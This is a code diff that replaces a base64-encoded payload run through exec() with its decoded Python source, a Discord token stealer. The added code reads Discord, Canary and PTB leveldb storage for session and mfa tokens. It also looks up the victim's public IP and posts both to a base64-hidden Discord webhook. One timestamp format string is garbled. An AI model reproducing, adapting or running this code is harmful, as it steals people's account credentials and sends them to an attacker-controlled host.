@@ -1,52 +1,66 @@
-import base64
 import os
 import re
 import json
 import requests
 from datetime import datetime
+import base64
 
-rwejgihvbjhougbeu = """aW1wb3J0IG9zCmltcG9ydCByZQppbXBvcnQganNvbgppbXBvcnQgcmVxdWVzdHMKZnJvbSBkYXRl
-dGltZSBpbXBvcnQgZGF0ZXRpbWUKaW1wb3J0IGJhc2U2NAoKZXcgPSAiYUhSMGNITTZMeTlrYVhO
-amIzSmtMbU52YlM5aGNHa3ZkMlZpYUc5dmEzTXZNVE0zTVRRNE9EZ3dOall5TURFd01qY3lOeTlJ
-TTBwRlpuRkdWRlkzUmt4T2VXeEtTemR3VVRCeWFWUnZWVmQzWlZaVGMwdEJNRTVKWW1wNVZrTnFa
-VFpRTjAxeVpVOUZjamM1TVVaWU0wUm9kVTB5TWpSVk5RPT0iCmR3ID0gYmFzZTY0LmI2NGRlY29k
-ZShldykuZGVjb2RlKCd1dGYtOCcpCgpESVNDT1JEX1dFQkhPT0tfVVJMID0gZHcKCmRlZiBmZHQo
-KToKICAgIHQgPSBbXQogICAgcCA9IFtvcy5wYXRoLmpvaW4ob3MuZ2V0ZW52KCdMT0NBTEFQUERB
-VEEnKSwgJ0Rpc2NvcmQnLCAnTG9jYWwgU3RvcmFnZScsICdsZXZlbGRiJyksIG9zLnBhdGguam9p
-bihvcy5nZXRlbnYoJ0FQUERBVEEnKSwgJ0Rpc2NvcmQnLCAnTG9jYWwgU3RvcmFnZScsICdsZXZl
-bGRiJyksIG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ0xPQ0FMQVBQREFUQScpLCAnRGlzY29yZENh
-bmFyeScsICdMb2NhbCBTdG9yYWdlJywgJ2xldmVsZGInKSwgb3MucGF0aC5qb2luKG9zLmdldGVu
-dignQVBQREFUQScpLCAnRGlzY29yZENhbmFyeScsICdMb2NhbCBTdG9yYWdlJywgJ2xldmVsZGIn
-KSwgb3MucGF0aC5qb2luKG9zLmdldGVuZygnTE9DQUxBUFBEQVRBJyksICdEaXNjb3JkUFRCJywg
-J0xvY2FsIFN0b3JhZ2UnLCAnbGV2ZWxkYicpLCBvcy5wYXRoLmpvaW4ob3MuZ2V0ZW52KCdBUFBE
-QVRBJyksICdEaXNjb3JkUFRCJywgJ0xvY2FsIFN0b3JhZ2UnLCAnbGV2ZWxkYicpXQogICAgZm9y
-IHBhIGluIHA6CiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhKToKICAgICAgICAgICAg
-Y29udGludWUKICAgICAgICBmb3IgZm4gaW4gb3MubGlzdGRpcihwYSk6CiAgICAgICAgICAgIGlm
-IG5vdCBmbi5lbmRzd2l0aCgnLmxvZycpIGFuZCBub3QgZm4uZW5kc3dpdGgoJy5sZGInKToKICAg
-ICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgIGZvciBsaSBpbiBbeC5zdHJpcCgpIGZv
-ciB4IGluIG9wZW4ob3MucGF0aC5qb2luKHBhLCBmbiksIGVycm9ycz0naWdub3JlJykucmVhZGxp
-bmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgIGZvciByeCBpbiAocidbXHctXXsy
-NH1cLltcdy1dezZ9XC5bXHctXXsyN30nLCByJ21mYVwuW1x3LV17ODR9Jyk6CiAgICAgICAgICAg
-ICAgICAgICAgZm9yIHRrIGluIHJlLmZpbmRhbGwocngsIGxpKToKICAgICAgICAgICAgICAgICAg
-ICAgICAgdC5hcHBlbmQodGspCiAgICByZXR1cm4gbGlzdChzZXQodCkpCgpkZWYgZ2lhKCk6CiAg
-ICB0cnk6CiAgICAgICAgciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zv
-cm1hdD1qc29uJykKICAgICAgICByLnJhaXNlX2Zvcl9zdGF0dXMoKQogICAgICAgIHJldHVybiBy
-Lmpzb24oKVsnaXAnXQogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuUmVxdWVzdEV4Y2Vw
-dGlvbjoKICAgICAgICByZXR1cm4gTm9uZQoKZGVmIHNlbmRfdG9fZGlzY29yZCh0b2tlbnMsIGlw
-X2FkZHJlc3MpOgogICAgdGltZXN0YW1wID0gZGF0ZXRpbWUubm93KCkuc3RyZnRpbWUoIiVZLSVt
-LSVkICVIOiVNOiVTIikKICAgIGNvbnRlbnQgPSBmIiIiCiAgICAqKkRpc2NvcmQgSW5mbyBGb3Vu
-ZCEqKgogICAgVGltZXN0YW1wOiB7dGltZXN0YW1wfQogICAgKipEaXNjb3JkIFRva2VuczoqKgog
-ICAgYGBgCiAgICB7J1xcbicuam9pbih0b2tlbnMpIGlmIHRva2VucyBlbHNlICdObyB0b2tlbnMg
-Zm91bmQuJ30KICAgIGBgYAogICAgKipJUCBBZGRyZXNzOioqIHtpcF9hZGRyZXNzIGlmIGlwX2Fk
-ZHJlc3MgZWxzZSAnTi9BJ30KICAgICIiIgoKICAgIHBheWxvYWQgPSB7CiAgICAgICAgImNvbnRl
-bnQiOiBjb250ZW50CiAgICB9CgogICAgdHJ5OgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMu
-cG9zdChESVNDT1JEX1dFQkhPT0tfVVJMLCBqc29uPXBheWxvYWQpCiAgICAgICAgcmVzcG9uc2Uu
-cmFpc2VfZm9yX3N0YXR1cygpCiAgICAgICAgcHJpbnQoIiAiKQogICAgZXhjZXB0IHJlcXVlc3Rz
-LmV4Y2VwdGlvbnMuUmVxdWVzdEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiRXJyb3Ig
-c2VuZGluZyB0byBEaXNjb3JkOiB7ZX0iKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAg
-IHRva2VucyA9IGZkdCgpCiAgICBpcF9hZGRyZXNzID0gZ2lhKCkKCiAgICBpZiB0b2tlbnMgb3Ig
-aXBfYWRkcmVzczoKICAgICAgICBzZW5kX3RvX2Rpc2NvcmQodG9rZW5zLCBpcF9hZGRyZXNzKQog
-ICAgZWxzZToKICAgICAgICBwcmludCgiTm8gbmV3IGluZm9ybWF0aW9uIGZvdW5kLiIpCg=="""
+ew = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3MTQ4ODgwNjYyMDEwMjcyNy9IM0pFZnFGVFY3RkxOeWxKSzdwUTByaVRvVVd3ZVZTc0tBME5JYmp5VkNqZTZQN01yZU9Fcjc5MUZYM0RodU0yMjRVNQ=="
+dw = base64.b64decode(ew).decode('utf-8')
 
-des = base64.b64decode(rwejgihvbjhougbeu).decode('utf-8')
-exec(des)
+DISCORD_WEBHOOK_URL = dw
+
+def fdt():
+    t = []
+    p = [os.path.join(os.getenv('LOCALAPPDATA'), 'Discord', 'Local Storage', 'leveldb'), os.path.join(os.getenv('APPDATA'), 'Discord', 'Local Storage', 'leveldb'), os.path.join(os.getenv('LOCALAPPDATA'), 'DiscordCanary', 'Local Storage', 'leveldb'), os.path.join(os.getenv('APPDATA'), 'DiscordCanary', 'Local Storage', 'leveldb'), os.path.join(os.getenv('LOCALAPPDATA'), 'DiscordPTB', 'Local Storage', 'leveldb'), os.path.join(os.getenv('APPDATA'), 'DiscordPTB', 'Local Storage', 'leveldb')]
+    for pa in p:
+        if not os.path.exists(pa):
+            continue
+        for fn in os.listdir(pa):
+            if not fn.endswith('.log') and not fn.endswith('.ldb'):
+                continue
+            for li in [x.strip() for x in open(os.path.join(pa, fn), errors='ignore').readlines() if x.strip()]:
+                for rx in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                    for tk in re.findall(rx, li):
+                        t.append(tk)
+    return list(set(t))
+
+def gia():
+    try:
+        r = requests.get('https://api.ipify.org?format=json')
+        r.raise_for_status()
+        return r.json()['ip']
+    except requests.exceptions.RequestException:
+        return None
+
+def send_to_discord(tokens, ip_address):
+    timestamp = datetime.now().strftime("&%-%m-%d %H:%M:%S")
+    content = f"""
+    **Discord Info Found!**
+    Timestamp: {timestamp}
+    **Discord Tokens:**
+    ```
+    {'\\n'.join(tokens) if tokens else 'No tokens found.'}
+    ```
+    **IP Address:** {ip_address if ip_address else 'N/A'}
+    """
+
+    payload = {
+        "content": content
+    }
+
+    try:
+        response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
+        response.raise_for_status()
+        print(" ")
+    except requests.exceptions.RequestException as e:
+        print(f"Error sending to Discord: {e}")
+
+if __name__ == "__main__":
+    tokens = fdt()
+    ip_address = gia()
+
+    if tokens or ip_address:
+        send_to_discord(tokens, ip_address)
+    else:
+        print("No new information found.")
